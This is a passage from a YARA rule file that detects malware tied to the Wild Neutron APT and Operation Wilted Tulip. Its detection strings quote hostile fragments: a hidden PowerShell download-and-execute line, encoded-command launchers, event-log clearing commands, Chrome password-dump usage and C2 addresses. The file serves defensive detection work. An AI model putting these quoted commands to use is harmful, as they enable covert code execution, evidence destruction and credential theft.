\"https://securelist.com/blog/research/71275/wild-neutron-economic-espionage-threat-actor-returns-with-new-tricks/\"\n        threat_names = \"Wild Neutron\"\n        vti_default_score = 5\n        vti_documents_score = 5\n        vti_scripts_score = 5\n        vti_browser_score = 5\n        vti_msi_score = 5\n        vti_static_score = 5\n        author = \"Florian Roth\"\n        source = \"https://github.com/Yara-Rules/rules\"\n        original_name = \"WildNeutron_Sample_1\"\n        license = \"GPL-2.0 (https://opensource.org/licenses/GPL-2.0)\"\n\n    strings:\n        $s0 = \"LiveUpdater.exe\" fullword wide\n        $s1 = \"id-at-postalAddress\" fullword ascii\n        $s2 = \"%d -> %d (default)\" fullword wide\n        $s3 = \"%s%s%s=%d,%s=%d,%s=%d,\" fullword wide\n        $s8 = \"id-ce-keyUsage\" fullword ascii\n        $s9 = \"Key Usage\" fullword ascii\n        $s32 = \"UPDATE_ID\" fullword wide\n        $s37 = \"id-at-commonName\" fullword ascii\n        $s38 = \"2008R2\" fullword wide\n        $s39 = \"RSA-alt\" fullword ascii\n        $s40 = \"%02d.%04d.%s\" fullword wide\n\n    condition:\n        uint16(0) == 0x5a4d and filesize < 800KB and all of them\n}\n\nrule WildNeutron_Sample_2\n{\n    meta:\n        description = \"Wild Neutron APT malware\"\n        ref = \"https://securelist.com/blog/research/71275/wild-neutron-economic-espionage-threat-actor-returns-with-new-tricks/\"\n        threat_names = \"Wild Neutron\"\n        vti_default_score = 5\n        vti_documents_score = 5\n        vti_scripts_score = 5\n        vti_browser_score = 5\n        vti_msi_score = 5\n        vti_static_score = 5\n        author = \"Florian Roth\"\n        source = \"https://github.com/Yara-Rules/rules\"\n        original_name = \"WildNeutron_Sample_2\"\n        license = \"GPL-2.0 (https://opensource.org/licenses/GPL-2.0)\"\n\n    strings:\n        $s0 = \"rundll32.exe \\\"%s\\\",#1\" fullword wide\n        $s1 = \"IgfxUpt.exe\" fullword wide\n        $s2 = \"id-at-postalAddress\" fullword ascii\n        $s3 = \"Intel(R) Common User Interface\" fullword wide\n        $s4 = \"%s%s%s=%d,%s=%d,%s=%d,\" fullword wide\n        $s11 = \"Key Usage\" fullword ascii\n        $s12 = \"Intel Integrated Graphics Updater\" fullword wide\n        $s13 = \"%sexpires on    : %04d-%02d-%02d %02d:%02d:%02d\" fullword ascii\n\n    condition:\n        uint16(0) == 0x5a4d and filesize < 600KB and all of them\n}\n\nrule WildNeutron_Sample_3\n{\n    meta:\n        description = \"Wild Neutron APT malware\"\n        ref = \"https://securelist.com/blog/research/71275/wild-neutron-economic-espionage-threat-actor-returns-with-new-tricks/\"\n        threat_names = \"Wild Neutron\"\n        vti_default_score = 5\n        vti_documents_score = 5\n        vti_scripts_score = 5\n        vti_browser_score = 5\n        vti_msi_score = 5\n        vti_static_score = 5\n        author = \"Florian Roth\"\n        source = \"https://github.com/Yara-Rules/rules\"\n        original_name = \"WildNeutron_Sample_3\"\n        license = \"GPL-2.0 (https://opensource.org/licenses/GPL-2.0)\"\n\n    strings:\n        $x1 = \"178.162.197.9\" fullword ascii\n        $x2 = \"\\\"http://fw.ddosprotected.eu:80 /opts resolv=drfx.chickenkiller.com\\\"\" fullword wide\n        $s1 = \"LiveUpdater.exe\" fullword wide\n        $s2 = \"id-at-postalAddress\" fullword ascii\n        $s3 = \"%d -> %d (default)\" fullword wide\n        $s4 = \"%s%s%s=%d,%s=%d,%s=%d,\" fullword wide\n        $s5 = \"id-at-serialNumber\" fullword ascii\n        $s6 = \"ECDSA with SHA256\" fullword ascii\n        $s7 = \"Acer LiveUpdater\" fullword wide\n\n    condition:\n        uint16(0) == 0x5a4d and filesize < 2020KB and (1 of ($x*) or all of ($s*))\n}\n\nrule WildNeutron_Sample_4\n{\n    meta:\n        description = \"Wild Neutron APT malware\"\n        ref = \"https://securelist.com/blog/research/71275/wild-neutron-economic-espionage-threat-actor-returns-with-new-tricks/\"\n        threat_names = \"Wild Neutron\"\n        vti_default_score = 5\n        vti_documents_score = 5\n        vti_scripts_score = 5\n        vti_browser_score = 5\n        vti_msi_score = 5\n        vti_static_score = 5\n        author = \"Florian Roth\"\n        source = \"https://github.com/Yara-Rules/rules\"\n        original_name = \"WildNeutron_Sample_4\"\n        license = \"GPL-2.0 (https://opensource.org/licenses/GPL-2.0)\"\n\n    strings:\n        $x1 = \"WinRAT-Win32-Release.exe\" fullword ascii\n        $s0 = \"rundll32.exe \\\"%s\\\",#1\" fullword wide\n        $s1 = \"RtlUpd.EXE\" fullword wide\n        $s2 = \"RtlUpd.exe\" fullword wide\n        $s3 = \"Driver Update and remove for Windows x64 or x86_32\" fullword wide\n        $s4 = \"Realtek HD Audio Update and remove driver Tool\" fullword wide\n        $s5 = \"%s%s%s=%d,%s=%d,%s=%d,\" fullword wide\n        $s6 = \"Key Usage\" fullword ascii\n        $s7 = \"id-at-serialNumber\" fullword ascii\n\n    condition:\n        uint16(0) == 0x5a4d and filesize < 1240KB and all of them\n}\n\nrule WildNeutron_Sample_5\n{\n    meta:\n        description = \"Wild Neutron APT malware\"\n        ref = \"https://securelist.com/blog/research/71275/wild-neutron-economic-espionage-threat-actor-returns-with-new-tricks/\"\n        threat_names = \"Wild Neutron\"\n        vti_default_score = 5\n        vti_documents_score = 5\n        vti_scripts_score = 5\n        vti_browser_score = 5\n        vti_msi_score = 5\n        vti_static_score = 5\n        author = \"Florian Roth\"\n        source = \"https://github.com/Yara-Rules/rules\"\n        original_name = \"WildNeutron_Sample_5\"\n        license = \"GPL-2.0 (https://opensource.org/licenses/GPL-2.0)\"\n\n    strings:\n        $s0 = \"LiveUpdater.exe\" fullword wide\n        $s1 = \"id-at-postalAddress\" fullword ascii\n        $s2 = \"%d -> %d (default)\" fullword wide\n        $s3 = \"%s%s%s=%d,%s=%d,%s=%d,\" fullword wide\n        $s4 = \"sha-1WithRSAEncryption\" fullword ascii\n        $s5 = \"Postal code\" fullword ascii\n        $s6 = \"id-ce-keyUsage\" fullword ascii\n        $s7 = \"Key Usage\" fullword ascii\n        $s8 = \"TLS-RSA-WITH-3DES-EDE-CBC-SHA\" fullword ascii\n        $s9 = \"%02d.%04d.%s\" fullword wide\n\n    condition:\n        uint16(0) == 0x5a4d and filesize < 1000KB and all of them\n}\n\nrule WildNeutron_Sample_6\n{\n    meta:\n        description = \"Wild Neutron APT malware\"\n        ref = \"https://securelist.com/blog/research/71275/wild-neutron-economic-espionage-threat-actor-returns-with-new-tricks/\"\n        threat_names = \"Wild Neutron\"\n        vti_default_score = 5\n        vti_documents_score = 5\n        vti_scripts_score = 5\n        vti_browser_score = 5\n        vti_msi_score = 5\n        vti_static_score = 5\n        author = \"Florian Roth\"\n        source = \"https://github.com/Yara-Rules/rules\"\n        original_name = \"WildNeutron_Sample_6\"\n        license = \"GPL-2.0 (https://opensource.org/licenses/GPL-2.0)\"\n\n    strings:\n        $s0 = \"mshtaex.exe\" fullword wide\n\n    condition:\n        uint16(0) == 0x5a4d and filesize < 310KB and all of them\n}\n\nrule WildNeutron_Sample_7\n{\n    meta:\n        description = \"Wild Neutron APT malware\"\n        ref = \"https://securelist.com/blog/research/71275/wild-neutron-economic-espionage-threat-actor-returns-with-new-tricks/\"\n        threat_names = \"Wild Neutron\"\n        vti_default_score = 5\n        vti_documents_score = 5\n        vti_scripts_score = 5\n        vti_browser_score = 5\n        vti_msi_score = 5\n        vti_static_score = 5\n        author = \"Florian Roth\"\n        source = \"https://github.com/Yara-Rules/rules\"\n        original_name = \"WildNeutron_Sample_7\"\n        license = \"GPL-2.0 (https://opensource.org/licenses/GPL-2.0)\"\n\n    strings:\n        $s0 = \"checking match for '%s' user %s host %s addr %s\" fullword ascii\n        $s1 = \"PEM_read_bio_PrivateKey failed\" fullword ascii\n        $s2 = \"usage: %s [-ehR] [-f log_facility] [-l log_level] [-u umask]\" fullword ascii\n        $s3 = \"%s %s for %s%.100s from %.200s port %d%s\" fullword ascii\n        $s4 = \"clapi32.dll\" fullword ascii\n        $s5 = \"Connection from %s port %d\" fullword ascii\n        $s6 = \"/usr/etc/ssh_known_hosts\" fullword ascii\n        $s7 = \"Version: %s - %s %s %s %s\" fullword ascii\n        $s8 = \"[-] connect()\" fullword ascii\n        $s9 = \"/bin/sh /usr/etc/sshrc\" fullword ascii\n        $s10 = \"kexecdhs.c\" fullword ascii\n        $s11 = \"%s: setrlimit(RLIMIT_FSIZE, { 0, 0 }): %s\" fullword ascii\n\n    condition:\n        uint16(0) == 0x5a4d and filesize < 5000KB and all of them\n}\n\nrule WildNeutron_Sample_8\n{\n    meta:\n        description = \"Wild Neutron APT malware\"\n        ref = \"https://securelist.com/blog/research/71275/wild-neutron-economic-espionage-threat-actor-returns-with-new-tricks/\"\n        threat_names = \"Wild Neutron\"\n        vti_default_score = 5\n        vti_documents_score = 5\n        vti_scripts_score = 5\n        vti_browser_score = 5\n        vti_msi_score = 5\n        vti_static_score = 5\n        author = \"Florian Roth\"\n        source = \"https://github.com/Yara-Rules/rules\"\n        original_name = \"WildNeutron_Sample_8\"\n        license = \"GPL-2.0 (https://opensource.org/licenses/GPL-2.0)\"\n\n    strings:\n        $x1 = \"RunFile: couldn't load SHELL32.DLL!\" fullword ascii\n        $x2 = \"RunFile: couldn't find ShellExecuteExA/W in SHELL32.DLL!\" fullword ascii\n        $x3 = \"Error executing CreateProcess()!!\" fullword wide\n        $x4 = \"cmdcmdline\" fullword wide\n        $x5 = \"Invalid input handle!!!\" fullword ascii\n        $s1 = \"Process %d terminated\" fullword wide\n        $s2 = \"Process is not running any more\" fullword wide\n        $s3 = \"javacpl.exe\" fullword wide\n        $s4 = \"Windows NT Version %lu.%lu\" fullword wide\n        $s5 = \"Usage: destination [reference]\" fullword wide\n        $s6 = \".com;.exe;.bat;.cmd\" fullword wide\n        $s7 = \") -%s-> %s (\" fullword ascii\n        $s8 = \"cmdextversion\" fullword wide\n        $s9 = \"Invalid pid (%s)\" fullword wide\n        $s10 = \"\\\"%s\\\" /K %s\" fullword wide\n        $s11 = \"Error setting %s (%s)\" fullword wide\n        $s12 = \"DEBUG: Cannot allocate memory for ptrNextNode->ptrNext!\" fullword ascii\n        $s13 = \"Failed to build full directory path\" fullword wide\n        $s14 = \"DEBUG: Cannot allocate memory for ptrFileArray!\" fullword ascii\n        $s15 = \"%-8s %-3s  %*s %s  %s\" fullword wide\n        $s16 = \" %%%c in (%s) do \" fullword wide\n\n    condition:\n        uint16(0) == 0x5a4d and filesize < 1677KB and 2 of ($x*) and 6 of ($s*)\n}\n\nrule WildNeutron_Sample_9\n{\n    meta:\n        description = \"Wild Neutron APT malware\"\n        ref = \"https://securelist.com/blog/research/71275/wild-neutron-economic-espionage-threat-actor-returns-with-new-tricks/\"\n        threat_names = \"Wild Neutron\"\n        vti_default_score = 5\n        vti_documents_score = 5\n        vti_scripts_score = 5\n        vti_browser_score = 5\n        vti_msi_score = 5\n        vti_static_score = 5\n        author = \"Florian Roth\"\n        source = \"https://github.com/Yara-Rules/rules\"\n        original_name = \"WildNeutron_Sample_9\"\n        license = \"GPL-2.0 (https://opensource.org/licenses/GPL-2.0)\"\n\n    strings:\n        $s0 = \"http://get.adobe.com/flashplayer/\" fullword wide\n        $s1 = \"xxxxxxxxxxxxxxxxxxxx\" fullword wide\n        $s4 = \" Player Installer/Uninstaller\" fullword wide\n        $s5 = \"Adobe Flash Plugin Updater\" fullword wide\n        $s6 = \"uSOFTWARE\\\\Adobe\" fullword wide\n        $s11 = \"2008R2\" fullword wide\n        $s12 = \"%02d.%04d.%s\" fullword wide\n        $s13 = \"%d -> %d\" fullword wide\n\n    condition:\n        uint16(0) == 0x5a4d and filesize < 500KB and all of them\n}\n\nrule WildNeutron_Sample_10\n{\n    meta:\n        description = \"Wild Neutron APT malware\"\n        ref = \"https://securelist.com/blog/research/71275/wild-neutron-economic-espionage-threat-actor-returns-with-new-tricks/\"\n        threat_names = \"Wild Neutron\"\n        vti_default_score = 5\n        vti_documents_score = 5\n        vti_scripts_score = 5\n        vti_browser_score = 5\n        vti_msi_score = 5\n        vti_static_score = 5\n        author = \"Florian Roth\"\n        source = \"https://github.com/Yara-Rules/rules\"\n        original_name = \"WildNeutron_Sample_10\"\n        license = \"GPL-2.0 (https://opensource.org/licenses/GPL-2.0)\"\n\n    strings:\n        $n1 = \"/c for /L %%i in (1,1,2) DO ping 127.0.0.1 -n 3 & type %%windir%%\\\\notepad.exe > %s & del /f %s\" fullword ascii\n        $s1 = \"%SYSTEMROOT%\\\\temp\\\\_dbg.tmp\" fullword ascii\n        $s2 = \"%SYSTEMROOT%\\\\SysWOW64\\\\mspool.dll\" fullword ascii\n        $s3 = \"%SYSTEMROOT%\\\\System32\\\\dpcore16t.dll\" fullword ascii\n        $s4 = \"%SYSTEMROOT%\\\\System32\\\\wdigestEx.dll\" fullword ascii\n        $s5 = \"%SYSTEMROOT%\\\\System32\\\\mspool.dll\" fullword ascii\n        $s6 = \"%SYSTEMROOT%\\\\System32\\\\kernel32.dll\" fullword ascii\n        $s7 = \"%SYSTEMROOT%\\\\SysWOW64\\\\iastor32.exe\" fullword ascii\n        $s8 = \"%SYSTEMROOT%\\\\System32\\\\msvcse.exe\" fullword ascii\n        $s9 = \"%SYSTEMROOT%\\\\System32\\\\mshtaex.exe\" fullword ascii\n        $s10 = \"%SYSTEMROOT%\\\\System32\\\\iastor32.exe\" fullword ascii\n        $s11 = \"%SYSTEMROOT%\\\\SysWOW64\\\\mshtaex.exe\" fullword ascii\n        $x1 = \"wdigestEx.dll\" fullword ascii\n        $x2 = \"dpcore16t.dll\" fullword ascii\n        $x3 = \"mspool.dll\" fullword ascii\n        $x4 = \"msvcse.exe\" fullword ascii\n        $x5 = \"mshtaex.exe\" fullword wide\n        $x6 = \"iastor32.exe\" fullword ascii\n        $y1 = \"Installer.exe\" fullword ascii\n        $y2 = \"Info: Process %s\" fullword ascii\n        $y3 = \"Error: GetFileTime %s 0x%x\" fullword ascii\n        $y4 = \"Install succeeded\" fullword ascii\n        $y5 = \"Error: RegSetValueExA 0x%x\" fullword ascii\n\n    condition:\n        uint16(0) == 0x5a4d and filesize < 400KB and ($n1 or (1 of ($s*) and 1 of ($x*) and 3 of ($y*)))\n}\n\nrule WildNeutron_javacpl\n{\n    meta:\n        description = \"Wild Neutron APT malware\"\n        ref = \"https://securelist.com/blog/research/71275/wild-neutron-economic-espionage-threat-actor-returns-with-new-tricks/\"\n        threat_names = \"Wild Neutron\"\n        vti_default_score = 5\n        vti_documents_score = 5\n        vti_scripts_score = 5\n        vti_browser_score = 5\n        vti_msi_score = 5\n        vti_static_score = 5\n        author = \"Florian Roth\"\n        source = \"https://github.com/Yara-Rules/rules\"\n        original_name = \"WildNeutron_javacpl\"\n        license = \"GPL-2.0 (https://opensource.org/licenses/GPL-2.0)\"\n\n    strings:\n        $x1 = \"javacpl.exe\" fullword wide\n        $s0 = \"RunFile: couldn't find ShellExecuteExA/W in SHELL32.DLL!\" fullword ascii\n        $s1 = \"Error executing CreateProcess()!!\" fullword wide\n        $s2 = \"http://www.java.com/en/download/installed.jsp?detect=jre\" fullword ascii\n        $s3 = \"RunFile: couldn't load SHELL32.DLL!\" fullword ascii\n        $s4 = \"Process is not running any more\" fullword wide\n        $s6 = \"Windows NT Version %lu.%lu\" fullword wide\n        $s7 = \"Usage: destination [reference]\" fullword wide\n        $s8 = \"Invalid input handle!!!\" fullword ascii\n        $s9 = \".com;.exe;.bat;.cmd\" fullword wide\n        $s10 = \") -%s-> %s (\" fullword ascii\n        $s11 = \"cmdextversion\" fullword wide\n        $s12 = \"Invalid pid (%s)\" fullword wide\n        $s13 = \"\\\"%s\\\" /K %s\" fullword wide\n        $s14 = \"Error setting %s (%s)\" fullword wide\n        $s16 = \"cmdcmdline\" fullword wide\n        $s39 = \"2008R2\" fullword ascii\n\n    condition:\n        uint16(0) == 0x5a4d and filesize < 1677KB and all of them\n}\n\nrule WiltedTulip_Tools_back\n{\n    meta:\n        description = \"Chrome password dumper used in Operation Wilted Tulip\"\n        ref = \"http://www.clearskysec.com/tulip\"\n        threat_names = \"Wilted Tulip, CopyKittens\"\n        vti_default_score = 5\n        vti_documents_score = 5\n        vti_scripts_score = 5\n        vti_browser_score = 5\n        vti_msi_score = 5\n        vti_static_score = 5\n        author = \"Florian Roth\"\n        source = \"https://github.com/Neo23x0/signature-base\"\n        original_name = \"WiltedTulip_Tools_back\"\n        license = \"GPL-3.0 (https://opensource.org/licenses/GPL-3.0)\"\n\n    strings:\n        $x1 = \"%s.exe -f \\\"C:\\\\Users\\\\Admin\\\\Google\\\\Chrome\\\\TestProfile\\\" -o \\\"c:\\\\passlist.txt\\\"\" fullword ascii\n        $x2 = \"\\\\ChromePasswordDump\\\\Release\\\\FireMaster.pdb\" fullword ascii\n        $x3 = \"//Dump Chrome Passwords to a Output file \\\"c:\\\\passlist.txt\\\"\" fullword ascii\n\n    condition:\n        (uint16(0) == 0x5a4d and filesize < 2000KB and 1 of them)\n}\n\nrule WiltedTulip_Tools_clrlg\n{\n    meta:\n        description = \"Windows eventlog cleaner used in Operation Wilted Tulip (file: clrlg.bat)\"\n        ref = \"http://www.clearskysec.com/tulip\"\n        threat_names = \"Wilted Tulip, CopyKittens\"\n        vti_default_score = 5\n        vti_documents_score = 5\n        vti_scripts_score = 5\n        vti_browser_score = 5\n        vti_msi_score = 5\n        vti_static_score = 5\n        author = \"Florian Roth\"\n        source = \"https://github.com/Neo23x0/signature-base\"\n        original_name = \"WiltedTulip_Tools_clrlg\"\n        license = \"GPL-3.0 (https://opensource.org/licenses/GPL-3.0)\"\n\n    strings:\n        $s1 = \"('wevtutil.exe el') DO (call :do_clear\" fullword ascii\n        $s2 = \"wevtutil.exe cl %1\" fullword ascii\n\n    condition:\n        filesize < 1KB and 1 of them\n}\n\nrule WiltedTulip_powershell\n{\n    meta:\n        description = \"PowerShell script used in Operation Wilted Tulip\"\n        ref = \"http://www.clearskysec.com/tulip\"\n        threat_names = \"Wilted Tulip, CopyKittens\"\n        vti_default_score = 5\n        vti_documents_score = 5\n        vti_scripts_score = 5\n        vti_browser_score = 5\n        vti_msi_score = 5\n        vti_static_score = 5\n        author = \"Florian Roth\"\n        source = \"https://github.com/Neo23x0/signature-base\"\n        original_name = \"WiltedTulip_powershell\"\n        license = \"GPL-3.0 (https://opensource.org/licenses/GPL-3.0)\"\n\n    strings:\n        $x1 = \"powershell.exe -nop -w hidden -c if([IntPtr]::Size -eq 4){$b='powershell.exe'}else{$b=$env:windir+\" ascii\n\n    condition:\n        1 of them\n}\n\nrule WiltedTulip_vminst\n{\n    meta:\n        description = \"Malware used in Operation Wilted Tulip\"\n        ref = \"http://www.clearskysec.com/tulip\"\n        threat_names = \"Wilted Tulip, CopyKittens\"\n        vti_default_score = 5\n        vti_documents_score = 5\n        vti_scripts_score = 5\n        vti_browser_score = 5\n        vti_msi_score = 5\n        vti_static_score = 5\n        author = \"Florian Roth\"\n        source = \"https://github.com/Neo23x0/signature-base\"\n        original_name = \"WiltedTulip_vminst\"\n        license = \"GPL-3.0 (https://opensource.org/licenses/GPL-3.0)\"\n\n    strings:\n        $x1 = \"\\\\C++\\\\Trojan\\\\Target\\\\\" ascii\n        $s1 = \"%s\\\\system32\\\\rundll32.exe\" fullword wide\n        $s2 = \"$C:\\\\Windows\\\\temp\\\\l.tmp\" fullword wide\n        $s3 = \"%s\\\\svchost.exe\" fullword wide\n        $s4 = \"args[10] is %S and command is %S\" fullword ascii\n        $s5 = \"LOGON USER FAILD \" fullword ascii\n        $s6 = \"vminst.tmp\" fullword wide\n        $s7 = \"operator co_await\" fullword ascii\n        $s8 = \"?ReflectiveLoader@@YGKPAX@Z\" fullword ascii\n        $s9 = \"%s -k %s\" fullword wide\n        $s10 = \"ERROR in %S/%d\" fullword ascii\n\n    condition:\n        uint16(0) == 0x5a4d and filesize < 900KB and ((1 of ($x*) or 5 of ($s*)) or pe.exports(\"?ReflectiveLoader@@YGKPAX@Z\"))\n}\n\nrule WiltedTulip_Windows_UM_Task\n{\n    meta:\n        description = \"Windows scheduled task as used in Operation Wilted Tulip\"\n        ref = \"http://www.clearskysec.com/tulip\"\n        threat_names = \"Wilted Tulip, CopyKittens\"\n        vti_default_score = 5\n        vti_documents_score = 5\n        vti_scripts_score = 5\n        vti_browser_score = 5\n        vti_msi_score = 5\n        vti_static_score = 5\n        author = \"Florian Roth\"\n        source = \"https://github.com/Neo23x0/signature-base\"\n        original_name = \"WiltedTulip_Windows_UM_Task\"\n        license = \"GPL-3.0 (https://opensource.org/licenses/GPL-3.0)\"\n\n    strings:\n        $r1 = \"<Command>C:\\\\Windows\\\\syswow64\\\\rundll32.exe</Command>\" fullword wide\n        $p1 = \"<Arguments>\\\"C:\\\\Users\\\\public\\\\\" wide\n        $c1 = \"svchost64.swp\\\",checkUpdate\" wide ascii\n        $c2 = \"svchost64.swp,checkUpdate\" wide ascii\n\n    condition:\n        ($r1 and $p1) or 1 of ($c*)\n}\n\nrule WiltedTulip_WindowsTask\n{\n    meta:\n        description = \"Hacktool used in Operation Wilted Tulip - Windows Tasks\"\n        ref = \"http://www.clearskysec.com/tulip\"\n        threat_names = \"Wilted Tulip, CopyKittens\"\n        vti_default_score = 5\n        vti_documents_score = 5\n        vti_scripts_score = 5\n        vti_browser_score = 5\n        vti_msi_score = 5\n        vti_static_score = 5\n        author = \"Florian Roth\"\n        source = \"https://github.com/Neo23x0/signature-base\"\n        original_name = \"WiltedTulip_WindowsTask\"\n        license = \"GPL-3.0 (https://opensource.org/licenses/GPL-3.0)\"\n\n    strings:\n        $x1 = \"<Command>C:\\\\Windows\\\\svchost.exe</Command>\" fullword wide\n        $x2 = \"<Arguments>-nop -w hidden -encodedcommand\" wide\n        $x3 = \"-encodedcommand JABzAD0ATgBlAHcALQBPAGIAagBlAGMAdAAgAEkATwAuAE0AZQBtAG8AcgB5AFMAdAByAGUAYQBtACgA\"\n\n    condition:\n        1 of them\n}\n\nrule WiltedTulip_tdtess\n{\n    meta:\n        description = \"Malicious service used in Operation Wilted Tulip\"\n        ref = \"http://www.clearskysec.com/tulip\"\n        threat_names = \"Wilted Tulip, CopyKittens\"\n        vti_default_score = 5\n        vti_documents_score = 5\n        vti_scripts_score = 5\n        vti_browser_score = 5\n        vti_msi_score = 5\n        vti_static_score = 5\n        author = \"Florian Roth\"\n        source = \"https://github.com/Neo23x0/signature-base\"\n        original_name = \"WiltedTulip_tdtess\"\n        license = \"GPL-3.0 (https://opensource.org/licenses/GPL-3.0)\"\n\n    strings:\n        $x1 = \"d2lubG9naW4k\" fullword wide\n        $x2 = \"C:\\\\Users\\\\admin\\\\Documents\\\\visual studio 2015\\\\Projects\\\\Export\\\\TDTESS_ShortOne\\\\WinService Template\\\\\" ascii\n        $s1 = \"\\\\WinService Template\\\\obj\\\\x64\\\\x64\\\\winlogin\" ascii\n        $s2 = \"winlogin.exe\" fullword wide\n\n    condition:\n        (uint16(0) == 0x5a4d and filesize < 200KB and (1 of ($x*) or 2 of them))\n}\n\nrule WiltedTulip_SilverlightMSI\n{\n    meta:\n        description = \"PowerShell tool call Get_AD_Users_Logon_History used in Operation Wilted Tulip\"\n        ref = \"http://www.clearskysec.com/tulip\"\n        threat_names = \"Wilted Tulip, CopyKittens\"\n        vti_default_score = 5\n        vti_documents_score = 5\n        vti_scripts_score = 5\n        vti_browser_score = 5\n        vti_msi_score = 5\n        vti_static_score = 5\n        author = \"Florian Roth\"\n        source = \"https://github.com/Neo23x0/signature-base\"\n        original_name = \"WiltedTulip_SilverlightMSI\"\n        license = \"GPL-3.0 (https://opensource.org/licenses/GPL-3.0)\"\n\n    strings:\n        $x1 = \".\\\\Get_AD_Users_Logon_History.ps1 -MaxEvent\" fullword ascii\n        $x2 = \"if ((Resolve-dnsname $_.\\\"IP Address\\\" -Type PTR -TcpOnly -DnsOnly -ErrorAction \\\"SilentlyContinue\\\").Type -eq \\\"PTR\\\")\" fullword ascii\n        $x3 = \"$Client_Name = (Resolve-dnsname $_.\\\"IP Address\\\" -Type PTR -TcpOnly -DnsOnly).NameHost  \" fullword ascii\n        $x4 = \"########## Find the Computer account in AD and if not found, throw an exception ###########\" fullword ascii\n\n    condition:\n        (filesize < 20KB and 1 of them)\n}\n\nrule WiltedTulip_matryoshka_Injector\n{\n    meta:\n        description = \"Hacktool used in Operation Wilted Tulip\"\n        ref = \"http://www.clearskysec.com/tulip\"\n        threat_names = \"Wilted Tulip, CopyKittens\"\n        vti_default_score = 5\n        vti_documents_score = 5\n        vti_scripts_score = 5\n        vti_browser_score = 5\n        vti_msi_score = 5\n        vti_static_score = 5\n        author = \"Florian Roth\"\n        source = \"https://github.com/Neo23x0/signature-base\"\n        original_name = \"WiltedTulip_matryoshka_Injector\"\n        license = \"GPL-3.0 (https://opensource.org/licenses/GPL-3.0)\"\n\n    strings:\n        $s1 = \"Injector.dll\" fullword ascii\n        $s2 = \"ReflectiveLoader\" fullword ascii\n\n    condition:\n        (uint16(0) == 0x5a4d and filesize < 1000KB and all of them) or (pe.exports(\"__dec\") and pe.exports(\"_check\") and pe.exports(\"_dec\") and pe.exports(\"start\") and pe.exports(\"test\"))\n}\n\nrule WiltedTulip_Zpp\n{\n    meta:\n        description = \"Hacktool used in Operation Wilted Tulip\"\n        ref = \"http://www.clearskysec.com/tulip\"\n        threat_names = \"Wilted Tulip, CopyKittens\"\n        vti_default_score = 5\n        vti_documents_score = 5\n        vti_scripts_score = 5\n        vti_browser_score = 5\n        vti_msi_score = 5\n        vti_static_score = 5\n        author = \"Florian Roth\"\n        source = \"https://github.com/Neo23x0/signature-base\"\n        original_name = \"WiltedTulip_Zpp\"\n        license = \"GPL-3.0 (https://opensource.org/licenses/GPL-3.0)\"\n\n    strings:\n        $x1 = \"[ERROR] Error Main -i -s -d -gt -lt -mb\" fullword wide\n        $x2 = \"[ERROR] Error Main -i(with.) -s -d -gt -lt -mb -o -e\" fullword wide\n        $s1 = \"LT Time invalid\" fullword wide\n        $s2 = \"doCompressInNetWorkDirectory\" fullword ascii\n        $s3 = \"files remaining ,total file save = \" fullword wide\n        $s4 = \"$ec996350-79a4-477b-87ae-2d5b9dbe20fd\" fullword ascii\n        $s5 = \"Destinition Directory Not Found\" fullword wide\n        $s6 = \"\\\\obj\\\\Release\\\\ZPP.pdb\" fullword ascii\n\n    condition:\n        uint16(0) == 0x5a4d and filesize < 30KB and (1 of ($x*) or 3 of them)\n}\n\nrule WiltedTulip_Netsrv_netsrvs\n{\n    meta:\n        description = \"Sample from Operation Wilted Tulip\"\n        ref = \"http://www.clearskysec.com/tulip\"\n        threat_names = \"Wilted Tulip, CopyKittens\"\n        vti_default_score = 5\n        vti_documents_score = 5\n        vti_scripts_score = 5\n        vti_browser_score = 5\n        vti_msi_score = 5\n        vti_static_score = 5\n        author = \"Florian Roth\"\n        source = \"https://github.com/Neo23x0/signature-base\"\n        original_name = \"WiltedTulip_Netsrv_netsrvs\"\n        license = \"GPL-3.0 (https://opensource.org/licenses/GPL-3.0)\"\n\n    strings:\n        $s1 = \"Process %d Created\" fullword ascii\n        $s2 = \"%s\\\\system32\\\\rundll32.exe\" fullword wide\n        $s3 = \"%s\\\\SysWOW64\\\\rundll32.exe\" fullword wide\n        $c1 = \"slbhttps\" fullword ascii\n        $c2 = \"/slbhttps\" fullword wide\n        $c3 = \"/slbdnsk1\" fullword wide\n        $c4 = \"netsrv\" fullword wide\n        $c5 = \"/slbhttps\" fullword wide\n\n    condition:\n        (uint16(0) == 0x5a4d and filesize < 1000KB and (all of ($s*) and 1 of ($c*)))\n}\n\nrule WiltedTulip_ReflectiveLoader\n{\n    meta:\n        description = \"Reflective loader (Cobalt Strike) used in Operation Wilted Tulip\"\n        ref = \"http://www.clearskysec.com/tulip\"\n        threat_names = \"Wilted Tulip, CopyKittens\"\n        vti_default_score = 5\n        vti_documents_score = 5\n        vti_scripts_score = 5\n        vti_browser_score = 5\n        vti_msi_score = 5\n        vti_static_score = 5\n        author = \"Florian Roth\"\n        source = \"https://github.com/Neo23x0/signature-base\"\n        original_name = \"WiltedTulip_ReflectiveLoader\"\n        license = \"GPL-3.0 (https://opensource.org/licenses/GPL-3.0)\"\n\n    strings:\n        $x1 = \"powershell -nop -exec bypass -EncodedCommand \\\"%s\\\"\" fullword ascii\n        $x2 = \"%d is an x86 process (can't inject x64 content)\" fullword ascii\n        $x3 = \"IEX (New-Object Net.Webclient).DownloadString('http://127.0.0.1:%u/'); %s\" fullword ascii\n        $x4 = \"Failed to impersonate token from %d (%u)\" fullword ascii\n        $x5 = \"Failed to impersonate logged on user %d (%u)\" fullword ascii\n        $x6 = \"%s.4%08x%08x%08x%08x%08x.%08x%08x%08x%08x%08x%08x%08x.%08x%08x%08x%08x%08x%08x%08x.%08x%08x%08x%08x%08x%08x%08x.%x%x.%s\" fullword ascii\n\n    condition:\n        (uint16(0) == 0x5a4d and filesize < 600KB and 1 of them) or (2 of them) or pe.exports(\"_ReflectiveLoader@4\")\n}\n\nrule WiltedTulip_Matryoshka_RAT\n{\n    meta:\n        description = \"Matryoshka RAT used in Operation Wilted Tulip\"\n        ref = \"http://www.clearskysec.com/tulip\"\n        threat_names = \"Wilted Tulip, CopyKittens\"\n        vti_default_score = 5\n        vti_documents_score = 5\n        vti_scripts_score = 5\n        vti_browser_score = 5\n        vti_msi_score = 5\n        vti_static_score = 5\n        author = \"Florian Roth\"\n        source = \"https://github.com/Neo23x0/signature-base\"\n        original_name = \"WiltedTulip_Matryoshka_RAT\"\n        license = \"GPL-3.0 (https://opensource.org/licenses/GPL-3.0)\"\n\n    strings:\n        $s1 = \"%S:\\\\Users\\\\public\" fullword wide\n        $s2 = \"ntuser.dat.swp\" fullword wide\n        $s3 = \"Job Save / Load Config\" fullword wide\n        $s4 